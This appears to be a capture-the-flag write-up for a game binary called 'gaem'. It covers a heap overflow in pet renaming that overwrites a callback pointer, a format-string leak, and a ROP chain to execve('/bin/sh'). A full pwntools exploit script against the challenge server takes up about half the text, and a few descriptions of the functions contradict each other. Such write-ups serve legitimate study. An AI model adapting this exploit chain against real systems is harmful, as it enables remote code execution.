Disassemble & Decompile :

  • After dumping, we got these main funtions:
$ objdump -d gaem | grep ">:"
...
0000000000401a2d <dog_purr>:
0000000000401a4e <cat_purr>:
0000000000401a6f <spawn_enemy>:
0000000000401ad3 <spawn_pet>:
0000000000401b37 <read_line>:
0000000000401b77 <draw_map>:
0000000000401c90 <pet_near>:
0000000000401cf4 <main>:
...
  • dog_purr func: act as callbacks when the player interacts with a pet.
  • cat_purr func: act as callbacks when the player interacts with a pet.

Both functions:

  • take a user-controlled string as input
  • pass it directly into printf

  • spawn_enemy func: This function initializes an enemy object on the heap:

    • Allocates 36 bytes using calloc
    • Copies the enemy name using strncpy (max 23 bytes)
    • Stores attributes:
      • v7[6] → HP
      • v7[7] → x-coordinate
      • v7[8] → y-coordinate

  • spawn_pet func: This function creates a pet object, which is more interesting from an exploitation perspective:

    • Allocates 48 bytes
    • Copies the pet name (max 31 bytes)
    • Stores:
      • offset +32 → function pointer (callback)
      • offset +40 → x-coordinate
      • offset +44 → y-coordinate

  • read_line func: This function is used throughout the program to handle user input.

    • Reads user input with a size limit
    • Replaces the trailing newline (\n) with a null byte
    • Exits cleanly if input is closed

  • draw_map func: Responsible for rendering the 2D map:

    • Initializes an 8×16 grid filled with ‘.’
    • Places:
      • ‘E’ for enemies
      • ‘P’ for pets
      • ‘@’ for the player
    • Then prints:
        printf("\n-- %s @ (%d,%d) --\n", name, x, y);

  • pet_near func: Checks whether a pet is adjacent to the player:

    • Iterates through all pets
    • Computes distance using:
      • |dx| <= 1 && |dy| <= 1
    • Returns a pointer to the nearby pet if found, otherwise NULL
    • Used in:
      • Talking to pets (t)
      • Renaming pets (r)

  • main func: The main game loop orchestrates all gameplay logic.

    • Initialization:
      • Disables buffering (setvbuf)
      • Sets a timeout (alarm(120))
      • Spawns a helper thread (thread_warmup)
      • Reads the hero’s name
      • Spawns:
        • 3 enemies
        • 2 pets (each with a different callback)
    • Game Loop:
      • m → move mode
      • l → display map
      • t → interact with nearby pet
      • q → quit

Vulnerabilities

1. Heap-based Buffer Overflow

In the pet rename functionality, the code uses strcpy to copy the user-provided name into a fixed-size buffer on the heap.

strcpy(pet->name, user_input);

The pet structure is approximately 0x30 bytes:

  • name: 32 bytes (offset 0)
  • func_ptr: 8 bytes (offset 32 / 0x20)

By providing a name longer than 32 bytes, we can overwrite the func_ptr.

2. Format String Vulnerability

The pet’s default interaction function is cat_purr, which calls printf with a fixed format string. However, if we overwrite the pet’s function pointer with the address of printf itself (0x4056b0), the interaction becomes:

printf(user_input);

This triggers a format string vulnerability.

Exploitation Strategy

1. Reconnaissance

  • The binary is statically linked and has NX enabled but no PIE.
  • We can find the address of printf using nm or objdump.
  • We can find ROP gadgets like pop rdi ; ret, pop rsi ; ret, etc., since it’s a large static binary.

2. Leakage

Using the format string vulnerability, we can leak stack addresses to find the location of our buffers and the return addresses.

  • %15$p leaks a stack address.
  • %16$p points to our input buffer.

3. Arbitrary Write & RCE

The plan was to use the format string vulnerability to write a ROP chain to the return address of the main function or a similar target. The ROP chain targets execve("/bin/sh", 0, 0):

  1. pop rdi ; ret -> address of “/bin/sh”
  2. pop rsi ; ret -> 0
  3. pop rax ; ret -> 59
  4. syscall

Script exploit (Poc)

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# --- Addresses & Gadgets ---
printf_addr = 0x4056b0
pop_rdi = 0x40224f
pop_rsi = 0x401abb
pop_rax = 0x4309db
syscall = 0x40143c
ret = 0x401016
# add rsp, 0x60 ; pop rbx ; pop r12 ; pop rbp ; ret
pivot_gadget = 0x428474

def exploit(io):
    log.info("Starting exploit...")
    
    # Init game
    io.recvuntil(b'name: ')
    io.sendline(b'Hero')
    io.recvuntil(b'> ')
    io.sendline(b'm')
    io.recvuntil(b'> ')
    io.sendline(b'ddss')
    
    # --- Step 1: Overwrite to Leak Stack ---
    io.recvuntil(b'> ')
    io.sendline(b'm')
    io.recvuntil(b'> ')
    io.sendline(b'r')
    io.recvuntil(b': ')
    io.sendline(b'A' * 0x20 + p64(printf_addr)[:3])
    
    io.recvuntil(b'> ')
    io.sendline(b't')
    io.recvuntil(b': ')
    io.sendline(b'LEAK.%15$p')
    io.recvuntil(b'LEAK.')
    
    L15 = int(io.recvline().strip(), 16)
    log.success(f"Stack Leak (L15): {hex(L15)}")
    
    # --- Step 2: Calculate /bin/sh address ---
    OFFSET = -224 
    bin_sh_addr = L15 + OFFSET
    log.info(f"Target /bin/sh addr: {hex(bin_sh_addr)}")
    
    # --- Step 3: Overwrite with Pivot Gadget ---
    io.recvuntil(b'> ')
    io.sendline(b'm')
    io.recvuntil(b'> ')
    io.sendline(b'r')
    io.recvuntil(b': ')
    io.sendline(b'A' * 0x20 + p64(pivot_gadget)[:3])
    
    # --- Step 4: Prepare ROP Chain and Trigger ---
    io.recvuntil(b'> ')
    io.sendline(b't')
    io.recvuntil(b': ')
    
    # Setup execve('/bin/sh', 0, 0)
    rop = b''
    rop += p64(pop_rdi) + p64(bin_sh_addr)
    rop += p64(pop_rsi) + p64(0)
    rop += p64(pop_rax) + p64(59)
    rop += p64(syscall)
    
    payload = (p64(ret) * 4) + rop + b'/bin/sh\x00'
    
    # --- GDB Debugging ---
    gdbscript = '''
    b *0x401f15
    b *0x40143c
    continue
    '''
    # gdb.attach(io, gdbscript=gdbscript)
    # sleep(1) 
    
    # Send payload and trigger shell
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        io = remote('challs.squ1rrel.dev', 5001)
    else:
        io = process('./gaem')
    
    exploit(io)
